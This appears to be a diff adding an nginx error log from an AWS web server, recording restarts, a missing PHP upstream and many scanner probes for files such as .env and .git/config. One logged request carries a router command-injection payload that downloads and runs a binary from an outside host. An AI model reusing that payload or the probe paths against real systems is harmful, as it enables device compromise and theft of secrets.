@@ -1,0 +1,201 @@
+2024/05/30 13:32:15 [notice] 1#1: using the "epoll" event method
+2024/05/30 13:32:15 [notice] 1#1: nginx/1.23.4
+2024/05/30 13:32:15 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2024/05/30 13:32:15 [notice] 1#1: OS: Linux 6.8.0-1008-aws
+2024/05/30 13:32:15 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2024/05/30 13:32:15 [notice] 1#1: start worker processes
+2024/05/30 13:32:15 [notice] 1#1: start worker process 28
+2024/05/30 13:35:51 [error] 28#28: *7 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 14.102.190.50, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147"
+2024/05/30 13:35:52 [error] 28#28: *3 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 14.102.190.50, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147", referrer: "http://35.87.154.147/index.php"
+2024/05/30 13:41:16 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2024/05/30 13:41:16 [notice] 28#28: gracefully shutting down
+2024/05/30 13:41:16 [notice] 28#28: exiting
+2024/05/30 13:41:16 [notice] 28#28: exit
+2024/05/30 13:41:16 [notice] 1#1: signal 17 (SIGCHLD) received from 28
+2024/05/30 13:41:16 [notice] 1#1: worker process 28 exited with code 0
+2024/05/30 13:41:16 [notice] 1#1: exit
+2024/05/30 13:41:21 [notice] 1#1: using the "epoll" event method
+2024/05/30 13:41:21 [notice] 1#1: nginx/1.23.4
+2024/05/30 13:41:21 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2024/05/30 13:41:21 [notice] 1#1: OS: Linux 6.8.0-1008-aws
+2024/05/30 13:41:21 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2024/05/30 13:41:21 [notice] 1#1: start worker processes
+2024/05/30 13:41:21 [notice] 1#1: start worker process 27
+2024/05/30 13:42:44 [error] 27#27: *5 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 14.102.190.50, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147"
+2024/05/30 13:42:44 [error] 27#27: *1 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 14.102.190.50, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147", referrer: "http://35.87.154.147/index.php"
+2024/05/30 13:45:23 [error] 27#27: *7 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 14.102.190.50, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147", referrer: "http://35.87.154.147/mysql.php"
+2024/05/30 13:45:23 [error] 27#27: *11 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 14.102.190.50, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147"
+2024/05/30 13:45:26 [error] 27#27: *7 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 14.102.190.50, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147", referrer: "http://35.87.154.147/mysql.php"
+2024/05/30 13:45:27 [error] 27#27: *7 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 14.102.190.50, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147", referrer: "http://35.87.154.147/mysql.php"
+2024/05/30 13:48:09 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2024/05/30 13:48:09 [notice] 27#27: gracefully shutting down
+2024/05/30 13:48:09 [notice] 27#27: exiting
+2024/05/30 13:48:09 [notice] 27#27: exit
+2024/05/30 13:48:09 [notice] 1#1: signal 17 (SIGCHLD) received from 27
+2024/05/30 13:48:09 [notice] 1#1: worker process 27 exited with code 0
+2024/05/30 13:48:09 [notice] 1#1: exit
+2024/05/30 13:48:13 [notice] 1#1: using the "epoll" event method
+2024/05/30 13:48:13 [notice] 1#1: nginx/1.23.4
+2024/05/30 13:48:13 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2024/05/30 13:48:13 [notice] 1#1: OS: Linux 6.8.0-1008-aws
+2024/05/30 13:48:13 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2024/05/30 13:48:13 [notice] 1#1: start worker processes
+2024/05/30 13:48:13 [notice] 1#1: start worker process 28
+2024/05/30 13:48:22 [error] 28#28: *2 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 14.102.190.50, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147", referrer: "http://35.87.154.147/mysql.php"
+2024/05/30 13:48:23 [error] 28#28: *5 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 14.102.190.50, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147"
+2024/05/30 13:48:26 [error] 28#28: *2 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 14.102.190.50, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147", referrer: "http://35.87.154.147/mysql.php"
+2024/05/30 13:50:20 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2024/05/30 13:50:20 [notice] 28#28: gracefully shutting down
+2024/05/30 13:50:20 [notice] 28#28: exiting
+2024/05/30 13:50:20 [notice] 28#28: exit
+2024/05/30 13:50:20 [notice] 1#1: signal 17 (SIGCHLD) received from 28
+2024/05/30 13:50:20 [notice] 1#1: worker process 28 exited with code 0
+2024/05/30 13:50:20 [notice] 1#1: exit
+2024/05/30 13:50:24 [notice] 1#1: using the "epoll" event method
+2024/05/30 13:50:24 [notice] 1#1: nginx/1.23.4
+2024/05/30 13:50:24 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2024/05/30 13:50:24 [notice] 1#1: OS: Linux 6.8.0-1008-aws
+2024/05/30 13:50:24 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2024/05/30 13:50:24 [notice] 1#1: start worker processes
+2024/05/30 13:50:24 [notice] 1#1: start worker process 28
+2024/05/30 13:50:50 [error] 28#28: *1 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 14.102.190.50, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147", referrer: "http://35.87.154.147/mysql.php"
+2024/05/30 13:50:51 [error] 28#28: *5 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 14.102.190.50, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147"
+2024/05/30 13:56:53 [error] 28#28: *7 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 14.102.190.50, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147", referrer: "http://35.87.154.147/mysql.php"
+2024/05/30 13:56:54 [error] 28#28: *11 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 14.102.190.50, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147"
+2024/05/30 13:58:02 [error] 28#28: *17 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 14.102.190.50, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147"
+2024/05/30 14:12:35 [error] 28#28: *22 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 14.102.190.50, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147", referrer: "http://35.87.154.147/mysql.php"
+2024/05/30 14:12:35 [error] 28#28: *29 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 14.102.190.50, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147"
+2024/05/30 14:12:35 [error] 28#28: *30 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 14.102.190.50, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147"
+2024/05/30 14:18:27 [error] 28#28: *41 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 14.102.190.50, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147", referrer: "http://35.87.154.147/mysql.php"
+2024/05/30 14:18:27 [error] 28#28: *45 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 14.102.190.50, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147"
+2024/05/30 14:20:20 [error] 28#28: *49 open() "/var/www/html/favicon.ico" failed (2: No such file or directory), client: 45.83.65.231, server: , request: "GET /favicon.ico HTTP/1.1", host: "35.87.154.147"
+2024/05/30 14:59:42 [error] 28#28: *52 open() "/var/www/html/Core/Skin/Login.aspx" failed (2: No such file or directory), client: 150.109.159.4, server: , request: "HEAD /Core/Skin/Login.aspx HTTP/1.1", host: "35.87.154.147:80"
+2024/05/30 16:43:16 [error] 28#28: *62 open() "/var/www/html/Core/Skin/Login.aspx" failed (2: No such file or directory), client: 150.109.159.4, server: , request: "HEAD /Core/Skin/Login.aspx HTTP/1.1", host: "35.87.154.147:80"
+2024/05/30 18:25:29 [error] 28#28: *93 open() "/var/www/html/Core/Skin/Login.aspx" failed (2: No such file or directory), client: 150.109.159.4, server: , request: "HEAD /Core/Skin/Login.aspx HTTP/1.1", host: "35.87.154.147:80"
+2024/05/30 19:03:15 [error] 28#28: *94 open() "/var/www/html/.env" failed (2: No such file or directory), client: 185.254.196.173, server: , request: "GET /.env HTTP/1.1", host: "35.87.154.147"
+2024/05/30 19:06:07 [error] 28#28: *97 open() "/var/www/html/.env" failed (2: No such file or directory), client: 135.125.246.110, server: , request: "GET /.env HTTP/1.1", host: "35.87.154.147"
+2024/05/30 19:50:36 [error] 28#28: *101 open() "/var/www/html/.env" failed (2: No such file or directory), client: 135.125.246.110, server: , request: "GET /.env HTTP/1.1", host: "35.87.154.147"
+2024/05/30 20:07:28 [error] 28#28: *106 open() "/var/www/html/Core/Skin/Login.aspx" failed (2: No such file or directory), client: 150.109.159.4, server: , request: "HEAD /Core/Skin/Login.aspx HTTP/1.1", host: "35.87.154.147:80"
+2024/05/30 21:31:25 [error] 28#28: *110 open() "/var/www/html/.git/config" failed (2: No such file or directory), client: 154.12.242.65, server: , request: "GET /.git/config HTTP/1.1", host: "35.87.154.147"
+2024/05/30 21:50:09 [error] 28#28: *111 open() "/var/www/html/Core/Skin/Login.aspx" failed (2: No such file or directory), client: 150.109.159.4, server: , request: "HEAD /Core/Skin/Login.aspx HTTP/1.1", host: "35.87.154.147:80"
+2024/05/30 22:19:47 [error] 28#28: *112 open() "/var/www/html/.env" failed (2: No such file or directory), client: 135.125.246.110, server: , request: "GET /.env HTTP/1.1", host: "35.87.154.147"
+2024/05/30 23:49:42 [error] 28#28: *118 open() "/var/www/html/.env" failed (2: No such file or directory), client: 78.153.140.179, server: , request: "GET /.env HTTP/1.1", host: "35.87.154.147"
+2024/05/31 00:12:39 [error] 28#28: *119 open() "/var/www/html/.env" failed (2: No such file or directory), client: 135.125.246.110, server: , request: "GET /.env HTTP/1.1", host: "35.87.154.147"
+2024/05/31 01:14:47 [error] 28#28: *137 open() "/var/www/html/Core/Skin/Login.aspx" failed (2: No such file or directory), client: 150.109.159.4, server: , request: "HEAD /Core/Skin/Login.aspx HTTP/1.1", host: "35.87.154.147:80"
+2024/05/31 01:33:37 [error] 28#28: *140 "/var/www/html/HNAP1/index.php" is not found (2: No such file or directory), client: 27.43.206.147, server: , request: "POST /HNAP1/ HTTP/1.0", host: "35.87.154.147:80"
+2024/05/31 02:19:10 [error] 28#28: *152 open() "/var/www/html/server" failed (2: No such file or directory), client: 159.89.17.243, server: , request: "GET /server HTTP/1.1", host: "35.87.154.147"
+2024/05/31 02:19:10 [error] 28#28: *153 open() "/var/www/html/.vscode/sftp.json" failed (2: No such file or directory), client: 159.89.17.243, server: , request: "GET /.vscode/sftp.json HTTP/1.1", host: "35.87.154.147"
+2024/05/31 02:19:10 [error] 28#28: *154 open() "/var/www/html/about" failed (2: No such file or directory), client: 159.89.17.243, server: , request: "GET /about HTTP/1.1", host: "35.87.154.147"
+2024/05/31 02:19:11 [error] 28#28: *155 open() "/var/www/html/debug/default/view" failed (2: No such file or directory), client: 159.89.17.243, server: , request: "GET /debug/default/view?panel=config HTTP/1.1", host: "35.87.154.147"
+2024/05/31 02:19:11 [error] 28#28: *156 open() "/var/www/html/v2/_catalog" failed (2: No such file or directory), client: 159.89.17.243, server: , request: "GET /v2/_catalog HTTP/1.1", host: "35.87.154.147"
+2024/05/31 02:19:11 [error] 28#28: *157 open() "/var/www/html/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application" failed (2: No such file or directory), client: 159.89.17.243, server: , request: "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1", host: "35.87.154.147"
+2024/05/31 02:19:12 [error] 28#28: *158 open() "/var/www/html/server-status" failed (2: No such file or directory), client: 159.89.17.243, server: , request: "GET /server-status HTTP/1.1", host: "35.87.154.147"
+2024/05/31 02:19:12 [error] 28#28: *159 open() "/var/www/html/login.action" failed (2: No such file or directory), client: 159.89.17.243, server: , request: "GET /login.action HTTP/1.1", host: "35.87.154.147"
+2024/05/31 02:19:12 [error] 28#28: *160 open() "/var/www/html/_all_dbs" failed (2: No such file or directory), client: 159.89.17.243, server: , request: "GET /_all_dbs HTTP/1.1", host: "35.87.154.147"
+2024/05/31 02:19:13 [error] 28#28: *161 open() "/var/www/html/.DS_Store" failed (2: No such file or directory), client: 159.89.17.243, server: , request: "GET /.DS_Store HTTP/1.1", host: "35.87.154.147"
+2024/05/31 02:19:13 [error] 28#28: *162 open() "/var/www/html/.env" failed (2: No such file or directory), client: 159.89.17.243, server: , request: "GET /.env HTTP/1.1", host: "35.87.154.147"
+2024/05/31 02:19:14 [error] 28#28: *163 open() "/var/www/html/.git/config" failed (2: No such file or directory), client: 159.89.17.243, server: , request: "GET /.git/config HTTP/1.1", host: "35.87.154.147"
+2024/05/31 02:19:14 [error] 28#28: *164 open() "/var/www/html/s/734313e2435313e27383e25333/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties" failed (2: No such file or directory), client: 159.89.17.243, server: , request: "GET /s/734313e2435313e27383e25333/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties HTTP/1.1", host: "35.87.154.147"
+2024/05/31 02:19:14 [error] 28#28: *165 open() "/var/www/html/config.json" failed (2: No such file or directory), client: 159.89.17.243, server: , request: "GET /config.json HTTP/1.1", host: "35.87.154.147"
+2024/05/31 02:19:15 [error] 28#28: *166 open() "/var/www/html/telescope/requests" failed (2: No such file or directory), client: 159.89.17.243, server: , request: "GET /telescope/requests HTTP/1.1", host: "35.87.154.147"
+2024/05/31 02:57:06 [error] 28#28: *171 open() "/var/www/html/Core/Skin/Login.aspx" failed (2: No such file or directory), client: 150.109.159.4, server: , request: "HEAD /Core/Skin/Login.aspx HTTP/1.1", host: "35.87.154.147:80"
+2024/05/31 03:03:30 [error] 28#28: *172 open() "/var/www/html/.env" failed (2: No such file or directory), client: 135.125.244.48, server: , request: "GET /.env HTTP/1.1", host: "35.87.154.147"
+2024/05/31 03:55:45 [error] 28#28: *181 open() "/var/www/html/form.html" failed (2: No such file or directory), client: 68.183.47.114, server: , request: "GET /form.html HTTP/1.1", host: "35.87.154.147"
+2024/05/31 03:55:46 [error] 28#28: *184 "/var/www/html/geoip/index.php" is not found (2: No such file or directory), client: 68.183.47.114, server: , request: "GET /geoip/ HTTP/1.1", host: "35.87.154.147"
+2024/05/31 03:55:46 [error] 28#28: *185 open() "/var/www/html/favicon.ico" failed (2: No such file or directory), client: 68.183.47.114, server: , request: "GET /favicon.ico HTTP/1.1", host: "35.87.154.147"
+2024/05/31 03:55:46 [error] 28#28: *187 open() "/var/www/html/bundle.js" failed (2: No such file or directory), client: 68.183.47.114, server: , request: "GET /bundle.js HTTP/1.1", host: "35.87.154.147"
+2024/05/31 03:55:47 [error] 28#28: *188 "/var/www/html/files/index.php" is not found (2: No such file or directory), client: 68.183.47.114, server: , request: "GET /files/ HTTP/1.1", host: "35.87.154.147"
+2024/05/31 04:32:58 [error] 28#28: *192 open() "/var/www/html/cgi-bin/luci/;stok=/locale" failed (2: No such file or directory), client: 179.43.185.130, server: , request: "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F45.142.182.70%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1", host: "35.87.154.147:80"
+2024/05/31 04:47:19 [error] 28#28: *193 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147", referrer: "http://35.87.154.147/mysql.php"
+2024/05/31 04:47:19 [error] 28#28: *194 open() "/var/www/html/favicon.ico" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /favicon.ico HTTP/1.1", host: "35.87.154.147", referrer: "http://35.87.154.147/mysql.php"
+2024/05/31 04:47:20 [error] 28#28: *195 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147"
+2024/05/31 04:47:20 [error] 28#28: *197 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147"
+2024/05/31 04:52:07 [error] 28#28: *202 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147", referrer: "http://35.87.154.147/mysql.php"
+2024/05/31 04:52:08 [error] 28#28: *204 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147"
+2024/05/31 04:52:13 [error] 28#28: *202 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147", referrer: "http://35.87.154.147/index.php"
+2024/05/31 04:52:21 [error] 28#28: *202 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147", referrer: "http://35.87.154.147/mysql.php"
+2024/05/31 04:54:55 [error] 28#28: *210 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147", referrer: "http://35.87.154.147/mysql.php"
+2024/05/31 04:54:55 [error] 28#28: *212 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147"
+2024/05/31 04:54:55 [error] 28#28: *213 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147"
+2024/05/31 04:55:05 [error] 28#28: *210 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147", referrer: "http://35.87.154.147/index.php"
+2024/05/31 04:57:54 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2024/05/31 04:57:54 [notice] 28#28: gracefully shutting down
+2024/05/31 04:57:54 [notice] 28#28: exiting
+2024/05/31 04:57:54 [notice] 28#28: exit
+2024/05/31 04:57:54 [notice] 1#1: signal 17 (SIGCHLD) received from 28
+2024/05/31 04:57:54 [notice] 1#1: worker process 28 exited with code 0
+2024/05/31 04:57:54 [notice] 1#1: exit
+2024/05/31 04:57:58 [notice] 1#1: using the "epoll" event method
+2024/05/31 04:57:58 [notice] 1#1: nginx/1.23.4
+2024/05/31 04:57:58 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2024/05/31 04:57:58 [notice] 1#1: OS: Linux 6.8.0-1008-aws
+2024/05/31 04:57:58 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2024/05/31 04:57:58 [notice] 1#1: start worker processes
+2024/05/31 04:57:58 [notice] 1#1: start worker process 28
+2024/05/31 04:58:37 [error] 28#28: *1 open() "/var/www/html/8085" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /8085 HTTP/1.1", host: "35.87.154.147"
+2024/05/31 04:58:37 [error] 28#28: *1 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147", referrer: "http://35.87.154.147/8085"
+2024/05/31 04:58:38 [error] 28#28: *4 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147"
+2024/05/31 04:58:38 [error] 28#28: *5 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147"
+2024/05/31 04:58:50 [error] 28#28: *5 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147"
+2024/05/31 04:58:51 [error] 28#28: *4 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147"
+2024/05/31 04:58:51 [error] 28#28: *1 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147", referrer: "http://35.87.154.147/index.php"
+2024/05/31 04:58:57 [error] 28#28: *1 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147", referrer: "http://35.87.154.147/mysql.php"
+2024/05/31 05:00:42 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2024/05/31 05:00:42 [notice] 28#28: gracefully shutting down
+2024/05/31 05:00:42 [notice] 28#28: exiting
+2024/05/31 05:00:42 [notice] 28#28: exit
+2024/05/31 05:00:42 [notice] 1#1: signal 17 (SIGCHLD) received from 28
+2024/05/31 05:00:42 [notice] 1#1: worker process 28 exited with code 0
+2024/05/31 05:00:42 [notice] 1#1: exit
+2024/05/31 05:00:45 [emerg] 1#1: host not found in upstream "php" in /etc/nginx/conf.d/default.conf:13
+2024/05/31 05:05:01 [notice] 1#1: using the "epoll" event method
+2024/05/31 05:05:01 [notice] 1#1: nginx/1.23.4
+2024/05/31 05:05:01 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2024/05/31 05:05:01 [notice] 1#1: OS: Linux 6.8.0-1008-aws
+2024/05/31 05:05:01 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2024/05/31 05:05:01 [notice] 1#1: start worker processes
+2024/05/31 05:05:01 [notice] 1#1: start worker process 28
+2024/05/31 05:06:42 [error] 28#28: *1 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147", referrer: "http://35.87.154.147/mysql.php"
+2024/05/31 05:06:43 [error] 28#28: *5 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147"
+2024/05/31 05:06:43 [error] 28#28: *6 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147"
+2024/05/31 05:06:56 [error] 28#28: *1 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147", referrer: "http://35.87.154.147/index.php"
+2024/05/31 05:07:00 [error] 28#28: *1 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147", referrer: "http://35.87.154.147/mysql.php"
+2024/05/31 05:08:31 [error] 28#28: *9 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147", referrer: "http://35.87.154.147/mysql.php"
+2024/05/31 05:08:32 [error] 28#28: *13 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147"
+2024/05/31 05:09:58 [error] 28#28: *18 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147", referrer: "http://35.87.154.147/mysql.php"
+2024/05/31 05:09:58 [error] 28#28: *21 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147"
+2024/05/31 05:10:29 [error] 28#28: *21 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147"
+2024/05/31 05:10:29 [error] 28#28: *22 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147"
+2024/05/31 05:10:40 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2024/05/31 05:10:40 [notice] 28#28: gracefully shutting down
+2024/05/31 05:10:53 [notice] 1#1: using the "epoll" event method
+2024/05/31 05:10:53 [notice] 1#1: nginx/1.23.4
+2024/05/31 05:10:53 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2024/05/31 05:10:53 [notice] 1#1: OS: Linux 6.8.0-1008-aws
+2024/05/31 05:10:53 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2024/05/31 05:10:53 [notice] 1#1: start worker processes
+2024/05/31 05:10:53 [notice] 1#1: start worker process 28
+2024/05/31 05:10:57 [error] 28#28: *1 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147", referrer: "http://35.87.154.147/mysql.php"
+2024/05/31 05:12:04 [error] 28#28: *5 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147", referrer: "http://35.87.154.147/mysql.php"
+2024/05/31 05:12:04 [error] 28#28: *9 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147"
+2024/05/31 05:12:15 [error] 28#28: *5 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147", referrer: "http://35.87.154.147/index.php"
+2024/05/31 05:12:18 [error] 28#28: *5 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147", referrer: "http://35.87.154.147/mysql.php"
+2024/05/31 05:12:37 [error] 28#28: *5 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147", referrer: "http://35.87.154.147/mysql.php"
+2024/05/31 05:14:25 [error] 28#28: *14 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147", referrer: "http://35.87.154.147/mysql.php"
+2024/05/31 05:14:25 [error] 28#28: *18 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147"
+2024/05/31 05:15:39 [error] 28#28: *20 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147", referrer: "http://35.87.154.147/mysql.php"
+2024/05/31 05:15:40 [error] 28#28: *24 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 103.66.61.209, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147"
+2024/05/31 06:03:04 [error] 28#28: *40 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 125.63.73.50, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147", referrer: "http://35.87.154.147/mysql.php"
+2024/05/31 06:03:04 [error] 28#28: *43 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 125.63.73.50, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147"
+2024/05/31 06:03:05 [error] 28#28: *44 open() "/var/www/html/meta.json" failed (2: No such file or directory), client: 125.63.73.50, server: , request: "GET /meta.json HTTP/1.1", host: "35.87.154.147"
+2024/05/31 06:23:30 [error] 28#28: *50 open() "/var/www/html/Core/Skin/Login.aspx" failed (2: No such file or directory), client: 150.109.159.4, server: , request: "HEAD /Core/Skin/Login.aspx HTTP/1.1", host: "35.87.154.147:80"
+2024/05/31 10:46:18 [notice] 1#1: using the "epoll" event method
+2024/05/31 10:46:18 [notice] 1#1: nginx/1.23.4
+2024/05/31 10:46:18 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2024/05/31 10:46:18 [notice] 1#1: OS: Linux 6.8.0-1008-aws
+2024/05/31 10:46:18 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2024/05/31 10:46:18 [notice] 1#1: start worker processes
+2024/05/31 10:46:18 [notice] 1#1: start worker process 28
+2024/05/31 10:46:18 [notice] 1#1: start worker process 29
+2024/05/31 10:50:15 [error] 28#28: *4 upstream timed out (110: Connection timed out) while reading response header from upstream, client: 125.63.73.50, server: , request: "GET /wp-admin/index.php HTTP/1.1", upstream: "fastcgi://192.168.16.2:9000", host: "18.236.154.22"
